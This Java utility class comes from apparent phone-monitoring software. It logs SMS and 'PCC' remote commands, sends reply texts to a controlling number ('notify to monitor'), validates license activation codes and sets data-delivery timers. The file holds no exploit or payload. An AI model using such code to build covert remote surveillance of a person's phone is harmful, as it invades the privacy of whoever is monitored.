package com.vvt.remotecommandmanager.utils;

import java.util.List;

import com.vvt.datadeliverymanager.Customization;
import com.vvt.datadeliverymanager.DeliveryResponse;
import com.vvt.datadeliverymanager.enums.ErrorResponseType;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.exceptions.FxNotImplementedException;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.database.FxDbNotOpenException;
import com.vvt.exceptions.database.FxDbOperationException;
import com.vvt.license.LicenseInfo;
import com.vvt.logger.FxLog;
import com.vvt.productinfo.ProductInfo;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.ActivationCodeNotMatchException;
import com.vvt.remotecommandmanager.exceptions.InvalidActivationCodeException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.sms.SmsUtil;

public class RemoteCommandUtil {
	private static final String TAG = "RemoteCommandUtil";
	private static final boolean LOGE = Customization.ERROR;
	
	public RemoteCommandUtil() {
		
	}
	
	public static void createSystemEvent(
			FxEventRepository eventRepository,
			RemoteCommandType type, FxEventDirection direction, String message) {
		
		FxSystemEvent event = new FxSystemEvent();
		event.setDirection(direction);
		event.setEventTime(System.currentTimeMillis());
		
		if (type == RemoteCommandType.PCC) {
			if (direction == FxEventDirection.IN)
				event.setLogType(FxSystemEventCategories.CATEGORY_PCC);
			else if(direction == FxEventDirection.OUT)
				event.setLogType(FxSystemEventCategories.CATEGORY_PCC_REPLY);
			
		} else {
			if (direction == FxEventDirection.IN)
				event.setLogType(FxSystemEventCategories.CATEGORY_SMS_CMD);
			else if(direction == FxEventDirection.OUT)
				event.setLogType(FxSystemEventCategories.CATEGORY_SMS_CMD_REPLY);
		}
		event.setMessage(message);
		
		//TODO : How to handle it if Event repo is fail.
		try {
			eventRepository.insert(event) ;
			
		} catch (FxDbNotOpenException e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		} catch (FxNotImplementedException e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		} catch (FxNullNotAllowedException e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		} catch (FxDbOperationException e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
	
	}
	
	public static String generateReplyMessage(ProductInfo productInfo, String commandCode, ProcessingResult result) {
		
		String msg = "";
		
		if (productInfo != null && result != null) {

			int productID = productInfo.getProductId();
			String productVersion = productInfo.getProductVersion();
			
			String statusMsg = "Error";
			if(result.isSuccess()) {
				statusMsg = "OK";
			}

			msg = String.format("[%s %s][%s] %s\n%s", 
					productID, productVersion, commandCode, statusMsg, result.getMessage());
		}
		return msg;
	}
	
	public static void sendReplySms(String recipientNumber, String message) {
		SmsUtil.sendSms(recipientNumber, message);
	}
	
	public static void handleException(
			FxEventRepository eventRepository,
			RemoteCommandException e, RemoteCommandData commandData, ProductInfo productInfo) {
		
		RemoteCommandException commandException = (RemoteCommandException) e;
		String errorMsg = MessageManager.getErrorMessage(commandException.getErrorCode());
		
		ProcessingResult result = new ProcessingResult();
		result.setIsSuccess(false);
		result.setMessage(errorMsg);

		String replyMessage = generateReplyMessage(productInfo,commandData.getCommandCode(), result);
		
		//save to system database
		RemoteCommandUtil.createSystemEvent(
				eventRepository,commandData.getRmtCommandType(), FxEventDirection.OUT, errorMsg);
		//notify to monitor.
		if(commandData != null) {
			if (commandData.isSmsReplyRequired()) {
				String senderNumber = getSenderNumber(commandData.getCommandCode(), commandData.getArguments(), commandData.getSenderNumber());
				RemoteCommandUtil.sendReplySms(senderNumber, replyMessage);
			}
		}
	}
	
	private static String getSenderNumber(String commandCode, List<String> arguments, String senderNumber) {
		final String ActivateWithActivationCodeAndURL = "14140";
		final String ActivateWithURL = "14141";
		final String Deactivate = "14142";
		
		if(commandCode.equals(ActivateWithActivationCodeAndURL)) {
			if(arguments.size() == 4) {
				return arguments.get(3);
			}
		} else if(commandCode.equals(ActivateWithURL)) {
			if(arguments.size() == 3) {
				return arguments.get(1);
			}
		} else if(commandCode.equals(Deactivate)) {
			if(arguments.size() == 4) {
				return arguments.get(2);
			}
		}
		
		return senderNumber;
	}
	
	public static void validateActivationCode(String activationCode, LicenseInfo licenseInfo) throws RemoteCommandException{
		
		activationCode = activationCode.trim();
		
		if (!activationCode.matches("[0-9]+")) {  
			throw new InvalidActivationCodeException();
		}
		
		if(!activationCode.equals(licenseInfo.getActivationCode())){
			throw new ActivationCodeNotMatchException();
		}

	}
	
	public static boolean isPhoneNumberFormat(String phoneNumber) {
		
		phoneNumber = phoneNumber.trim();
		if (phoneNumber.matches("\\+[0-9]+") || phoneNumber.matches("[0-9]+")) {  
			return true;
		} else {
			return false;
		}
	}
	
	public static String getErrorMessage(DeliveryResponse response) {
		if(response.getErrorResponseType() == ErrorResponseType.ERROR_HTTP){
			return MessageManager.getErrorMessage(-329);
		} else if(response.getErrorResponseType() == ErrorResponseType.ERROR_PAYLOAD) {
			return MessageManager.getErrorMessage(-328);
		} else {
			int statusCode = response.getStatusCode();
			if(statusCode == -330) {
				return response.getStatusMessage() + "(-330)";
			} else {
				return MessageManager.getErrorMessage(statusCode);
			}
		}
	}
	
	public static List<String> removeActivationCodeFromArgs(List<String> list) {
		/*String[] array = (String[])list.toArray(new String[list.size()]);
        String[] argsWithoutActivationCode = new String[array.length - 1] ;
        System.arraycopy(array, 1, argsWithoutActivationCode, 0, (array.length - 1));
        
        return Arrays.asList(array);*/
		
		list.remove(0);
		return list;
    }
	
	public static long getTimerValue(int index) {
    	long seconds = -1;
        switch (index) {
        case 1:
            seconds = 10 * 1000;
            break;
        case 2:
            seconds = 30 * 1000;
            break;
        case 3:
            seconds = 60 * 1000;
            break;
        case 4:
            seconds = 300 * 1000;
            break;
        case 5:
            seconds = 600 * 1000;
            break;
        case 6:
            seconds = 1200 * 1000;
            break;
        case 7:
            seconds = 2400 * 1000;
            break;
        case 8:
            seconds = 3600 * 1000;
            break;
        default:
            seconds = -1;
        }
        return seconds;
    }
	
	public static String getTimeAsString(long deliveryPeriod) {
        String seconds = "unknown";
        
        int index = (int) (deliveryPeriod / 1000);
        
        switch (index) {
        case 10:
            seconds = "10 Sec";
            break;
        case 30:
            seconds = "30 Secs";
            break;
        case 60:
            seconds = "1 Min";
            break;
        case 300:
            seconds = "5 Min";
            break;
        case 600:
            seconds = "10 Mins";
            break;
        case 1200:
            seconds = "20 Mins";
            break;
        case 2400:
            seconds = "40 Mins";
            break;
        case 3600:
            seconds = "1 Hour";
            break;
        default:
            seconds = "unknown";
        }
        
        return seconds;
	}

	
}
